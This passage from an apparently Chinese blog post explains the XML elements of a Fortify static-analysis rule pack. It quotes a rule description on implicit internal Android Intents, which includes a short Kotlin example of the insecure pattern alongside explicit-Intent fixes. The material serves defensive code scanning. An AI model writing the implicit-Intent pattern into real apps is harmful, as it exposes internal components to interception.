class="hljs-tag">&lt;/<span class="hljs-name">RuleID</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StructuralMatch</span>&gt;</span></span><br><span class="language-xml">        &lt;![CDATA[</span><br><span class="language-xml">        FunctionCall fc: function is [Function:</span><br><span class="language-xml">                name == &quot;registerMBean&quot;</span><br><span class="language-xml">                and enclosingClass.supers contains [Class: name == &quot;javax.management.MBeanServer&quot;]</span><br><span class="language-xml">            ]</span><br><span class="language-xml">            and arguments[0] is [Expression:</span><br><span class="language-xml">                reachingTypes contains [Type: definition is [Class jmxbean:]]</span><br><span class="language-xml">            ]</span><br><span class="language-xml">    ]]&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StructuralMatch</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Definition</span>&gt;</span></span><br><span class="language-xml">        &lt;![CDATA[</span><br><span class="language-xml">        foreach jmxbean &#123;</span><br><span class="language-xml">            Label(jmxbean, &quot;JMXBean&quot;)</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">    ]]&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Definition</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">CharacterizationRule</span>&gt;<br></code></pre></td></tr></table></figure><p>字符化规则（<code>&lt;CharacterizationRule&gt;</code>），用于识别和标记 Java 代码中特定的结构模式。</p><ul><li>CharacterizationRule：<ul><li>formatVersion：<strong>格式版本，</strong><code>formatVersion=&quot;3.7&quot;</code> 指明了规则使用的格式版本。</li><li>language：<strong>语言，</strong><code>language=&quot;java&quot;</code> 指明了这条规则适用于 Java 语言。</li></ul></li><li>MetaInfo：元数据，<code>&lt;MetaInfo&gt;</code> 元素提供了关于规则的分类信息。<ul><li>Group：<code>&lt;Group name=&quot;package&quot;&gt;Java Core JMX&lt;/Group&gt;</code> 表示这条规则属于 “Java Core JMX” 包。</li></ul></li><li>RuleID：规则唯一的标识符</li><li>StructuralMatch：结构匹配，<code>&lt;StructuralMatch&gt;</code> 元素定义了要匹配的代码结构。<ul><li><code>FunctionCall fc</code> 表示要匹配的函数调用。</li><li><code>function is [Function: name == &quot;registerMBean&quot; and enclosingClass.supers contains [Class: name == &quot;javax.management.MBeanServer&quot;]]</code> 表示要匹配的函数名为 <code>registerMBean</code>，并且该函数所在类的超类包含 <code>javax.management.MBeanServer</code>。</li><li><code>arguments[0] is [Expression: reachingTypes contains [Type: definition is [Class jmxbean:]]]</code> 表示第一个参数的类型是某个类 <code>jmxbean</code>。</li></ul></li><li>Definition：<strong>定义，</strong><code>&lt;Definition&gt;</code> 元素定义了在匹配到特定结构时要执行的操作。<ul><li><code>foreach jmxbean &#123; Label(jmxbean, &quot;JMXBean&quot;) &#125;</code> 表示对每一个匹配到的 <code>jmxbean</code> 类型，为其添加一个标签 <code>&quot;JMXBean&quot;</code>。</li></ul></li></ul><h2 id="Descirptions标签分析"><a href="#Descirptions标签分析" class="headerlink" title="Descirptions标签分析"></a>Descirptions标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Descriptions</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Description</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;desc.controlflow.java.intent_manipulation_implicit_internal_intent&quot;</span> <span class="hljs-attr">formatVersion</span>=<span class="hljs-string">&quot;3.4&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Abstract</span>&gt;</span></span><br><span class="language-xml">                    &lt;![CDATA[&lt;Paragraph&gt;在 &lt;Replace key=&quot;PrimaryLocation.file&quot;/&gt; 的第 &lt;Replace key=&quot;PrimaryLocation.line&quot;/&gt; 行检测到隐式内部 &lt;code&gt;Intent&lt;/code&gt;。隐式的内部意图可能会使系统遭受对内部组件的中间人攻击。&lt;AltParagraph&gt;检测到隐式内部 &lt;code&gt;Intent&lt;/code&gt;。隐式的内部意图可能会使系统遭受对内部组件的中间人攻击。&lt;/AltParagraph&gt;&lt;/Paragraph&gt;]]&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Abstract</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Explanation</span>&gt;</span></span><br><span class="language-xml">                    &lt;![CDATA[内部 &lt;code&gt;Intent&lt;/code&gt; 使用内部组件定义的自定义操作。隐式意图可以促进从任何给定外部组件调用意图，而无需了解特定组件。将两者结合起来使应用程序能够从所需的应用程序上下文外部访问为特定内部使用指定的意图。</span><br><span class="language-xml"></span><br><span class="language-xml">                    通过外部应用程序处理内部 &lt;code&gt;Intent&lt;/code&gt; 的能力可以实现各种严重程度不等的中间人攻击，从信息泄露、拒绝服务到远程代码执行，具体取决于 &lt;code&gt;Intent&lt;/code&gt; 指定的内部操作的能力。</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;b&gt;示例 1：&lt;/b&gt;以下代码使用隐式内部 &lt;code&gt;Intent&lt;/code&gt;。</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;pre&gt;</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    val imp_internal_intent_action = Intent(&quot;INTERNAL_ACTION_HERE&quot;)</span><br><span class="language-xml">                    startActivity(imp_internal_intent_action)</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    &lt;/pre&gt;]]&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Explanation</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Recommendations</span>&gt;</span></span><br><span class="language-xml">                    &lt;![CDATA[仅调用具有明确意图的内部应用程序。显式 &lt;code&gt;Intent&lt;/code&gt; 是显式设置其组件、类、类名和包的意图。</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;b&gt;示例 2：&lt;/b&gt;以下代码使用显式内部 &lt;code&gt;Intent&lt;/code&gt;。</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;pre&gt;</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    val exp_internal_intent = Intent(&quot;INTERNAL_ACTION_HERE&quot;, Uri.EMPTY, this, DownloadService::class.java)</span><br><span class="language-xml">                    startActivity(exp_internal_intent)</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    &lt;/pre&gt;</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;b&gt;示例 3：&lt;/b&gt;以下代码使用隐式内部 &lt;code&gt;Intent&lt;/code&gt;，该意图已通过 setter 更新为显式。</span><br><span class="language-xml"></span><br><span class="language-xml">                    &lt;pre&gt;</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    val imp_internal_intent_remediate_action = Intent(&quot;INTERNAL_ACTION_HERE&quot;)</span><br><span class="language-xml"></span><br><span class="language-xml">                    imp_internal_intent_remediate_action.`package` = &quot;package&quot;</span><br><span class="language-xml">                    imp_internal_intent_remediate_action.setClass(this, DownloadService::class.java)</span><br><span class="language-xml">                    imp_internal_intent_remediate_action.component = componentName</span><br><span class="language-xml"></span><br><span class="language-xml">                    startActivity(imp_internal_intent_remediate_action)</span><br><span class="language-xml">                    ...</span><br><span class="language-xml">                    &lt;/pre&gt;]]&gt;</span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">Recommendations</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">References</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Remediation of Implicit Internal Intent Vulnerability]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Source</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[https://support.google.com/faqs/answer/10399926]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Source</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[CWE ID 99]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - Common Weakness Enumeration]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[CCI-001094]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - DISA Control Correlation Identifier Version 2]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Indirect Access to Sensitive Data]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - General Data Protection Regulation]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[SC-5 Denial of Service Protection (P1)]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - NIST Special Publication 800-53 Revision 4]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[SC-5 Denial of Service Protection]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - NIST Special Publication 800-53 Revision 5]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[A9 Application Denial of Service]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - OWASP Top 10 2004]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Requirement 6.5.1]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Title</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">                            &lt;![CDATA[Standards Mapping - Payment Card Industry Data Security Standard Version 1.1]]&gt;</span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">References</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Descriptions</span>&gt;<br></code></pre></td></tr></table></figure><ul><li>Description：规则描述，这里将描述信息单独拎出来，使用的化直接引用就行，类似这种：<Description ref="desc.controlflow.java.code_correctness_call_to_sleep_in_lock"><ul><li><strong>版本格式</strong>：<code>formatVersion=&quot;3.4&quot;</code> 指明了规则使用的格式版本。</li><li><strong>ID</strong>：<code>id=&quot;desc.controlflow.java.intent_manipulation_implicit_internal_intent&quot;</code> 是一个唯一的标识符，用于区分不同的描述性规则。</li></ul></li><li>Abstract：<code>&lt;Abstract&gt;</code> 元素提供了规则的简要说明。<ul><li><code>Paragraph</code>：<code>&lt;Paragraph&gt;</code> 描述了在特定文件和行号检测到隐式内部 <code>Intent</code>，并指出隐式内部意图可能会使系统遭受中间人攻击。</li><li><code>AltParagraph</code>：<code>&lt;AltParagraph&gt;</code> 提供了一个简短的备用描述。</li></ul></li><li>Explanation：详细解释</li><li>Recommendations：推荐措施</li><li>References：参考</li></ul><h2 id="ControlflowStateStrings标签分析"><a href="#ControlflowStateStrings标签分析" class="headerlink" title="ControlflowStateStrings标签分析"></a>ControlflowStateStrings标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">ControlflowStateStrings</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StateStrings</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;statedesc.java.null_assigned&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Enter</span>&gt;</span>%&#123;p&#125; is assigned null<span class="hljs-tag">&lt;/<span class="hljs-name">Enter</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StateStrings</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">ControlflowStateStrings</span>&gt;<br></code></pre></td></tr></table></figure><p>控制流状态字符串概述</p><ul><li>StateStrings：<strong>状态字符串，</strong><StateStrings>元素包含了描述状态变化的字符串。<ul><li><strong>Enter：进入状态，</strong><code>&lt;Enter&gt;%&#123;p&#125; is assigned null&lt;/Enter&gt;</code> 描述了当变量被赋值为 <code>null</code> 时的状态变化。</li><li>id：<code>id=&quot;statedesc.java.null_assigned&quot;</code> 是一个唯一的标识符，用于区分不同的控制流状态字符串。</li></ul></li></ul><p>说明：</p><ul><li>id：<code>statedesc.java.null_assigned</code> 这个 id 表示这是一个与 Java 语言相关的状态描述，具体描述了变量被赋值为 <code>null</code> 的情况。</li><li><strong>进入状态</strong>：<code>%&#123;p&#125; is assigned null</code> 这个字符串使用占位符 <code>%&#123;p&#125;</code> 来表示变量名。当工具检测到某个变量被赋值为 <code>null</code> 时，会用实际的变量名替换 <code>%&#123;p&#125;</code>，从而生成具体的描述信息。</li></ul><h2 id="TaintFlagDeclarations标签分析"><a href="#TaintFlagDeclarations标签分析" class="headerlink" title="TaintFlagDeclarations标签分析"></a>TaintFlagDeclarations标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">TaintFlagDescriptions</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FlagDescription</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ARGS&quot;</span>&gt;</span>Command Line Arguments<span class="hljs-tag">&lt;/<span class="hljs-name">FlagDescription</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FlagDescription</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PRIVATE&quot;</span>&gt;</span>Private Information<span class="hljs-tag">&lt;/<span class="hljs-name">FlagDescription</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">TaintFlagDescriptions</span>&gt;<br></code></pre></td></tr></table></figure><p><code>&lt;TaintFlagDescriptions&gt;</code>污点标志描述</p><ul><li>FlagDescription：<strong>污点标志描述，</strong><code>&lt;FlagDescription&gt;</code> 元素定义了每个污点标志的名称和描述。<ul><li><code>name</code> 属性指定了污点标志的名称。</li><li>value描述：元素的文本内容提供了污点标志的描述。</li></ul></li></ul><p>这段 XML 代码定义了两个污点标志描述：</p><ul><li><code>ARGS</code>：表示数据来源于命令行参数。</li><li><code>PRIVATE</code>：表示数据包含私有信息。</li></ul><h2 id="Coverage-标签分析"><a href="#Coverage-标签分析" class="headerlink" title="Coverage 标签分析"></a>Coverage 标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Coverage</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FunctionIdentifier</span> <span class="hljs-attr">formatVersion</span>=<span class="hljs-string">&quot;3.8&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">MatchExpression</span>&gt;</span>java.io/</span><br><span class="language-xml">            File.&#123;toPath,getPath,getAbsolutePath,getCanonicalPath,getCanonicalFile&#125;()<span class="hljs-tag">&lt;/<span class="hljs-name">MatchExpression</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FunctionIdentifier</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FunctionIdentifier</span> <span class="hljs-attr">formatVersion</span>=<span class="hljs-string">&quot;6.10&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">MatchExpression</span>&gt;</span>java.io / ObjectOutputStream.init^()<span class="hljs-tag">&lt;/<span class="hljs-name">MatchExpression</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FunctionIdentifier</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Coverage</span>&gt;<br></code></pre></td></tr></table></figure><p><Coverage>覆盖率配置</p><ul><li>FunctionIdentifier：<strong>函数标识符，定义了需要覆盖的函数或方法。</strong><ul><li>formatVersion：函数标识符的格式版本。</li><li>MatchExpression：匹配函数或方法的表达式。</li></ul></li></ul><p>表达式描述：</p><p><code>java.io/File.&#123;toPath,getPath,getAbsolutePath,getCanonicalPath,getCanonicalFile&#125;()</code></p><p>匹配表达式指定了 <code>java.io.File</code> 类中的多个方法，包括 <code>toPath</code>、<code>getPath</code>、<code>getAbsolutePath</code>、<code>getCanonicalPath</code> 和 <code>getCanonicalFile</code>。这些方法都与文件路径的获取有关。</p><h1 id="Masks标签分析"><a href="#Masks标签分析" class="headerlink" title="Masks标签分析"></a>Masks标签分析</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Masks</span> revision=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mask:Mask</span> <span class="hljs-attr">builtin</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Targeted&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">mask:Exclusion</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">mask:Attribute</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;inputsource&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Serialized Data&quot;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Exclusion</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">mask:Exclusion</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">mask:Attribute</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;inputsource&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Windows Registry&quot;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Exclusion</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Mask</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mask:Mask</span> <span class="hljs-attr">builtin</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Broad&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">mask:Description</span>&gt;</span></span><br><span class="language-xml">            &lt;![CDATA[此设置向源代码分析器提供了一套最全面的规则。通过它的使用可以发现一系列需要审核的安全问题。]]&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Description</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Mask</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mask:Mask</span> <span class="hljs-attr">builtin</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Medium&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">mask:Mask</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Masks</span>&gt;<br></code></pre></td></tr></table></figure><p>Mask：掩码，用于静态代码分析工具（如 Fortify SCA）来配置不同的分析规则集。</p><ul><li><code>&lt;mask:Mask&gt;</code>： 元素定义了不同的分析规则集。</li><li><code>builtin=&quot;true&quot;</code>： 表示这是一个预定义的掩码。</li><li><code>name</code> ：属性指定了掩码的名称。</li><li><code>default=&quot;true&quot;</code> ：表示这是默认的掩码。</li></ul><h1 id="Localization-标签分析"><a href="#Localization-标签分析" class="headerlink" title="Localization 标签分析"></a>Localization 标签分析</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Localization</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Mapping</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">KeyString</span>&gt;</span>Weak Encryption<span class="hljs-tag">&lt;/<span class="hljs-name">KeyString</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">LocalString</span>&gt;</span>Weak Encryption<span class="hljs-tag">&lt;/<span class="hljs-name">LocalString</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Mapping</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Mapping</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">KeyString</span>&gt;</span>User-Controlled Key Size<span class="hljs-tag">&lt;/<span class="hljs-name">KeyString</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">LocalString</span>&gt;</span>User-Controlled Key Size<span class="hljs-tag">&lt;/<span class="hljs-name">LocalString</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Mapping</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Localization</span>&gt;;<br></code></pre></td></tr></table></figure><p>本地化配置，管理和翻译不同的字符串</p><ul><li><code>&lt;Localization&gt;</code> 是根元素，包含多个映射（<code>&lt;Mapping&gt;</code>）。</li><li><code>&lt;Mapping&gt;</code> 元素定义了键字符串（<code>&lt;KeyString&gt;</code>）和本地化字符串（<code>&lt;LocalString&gt;</code>）之间的对应关系。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" 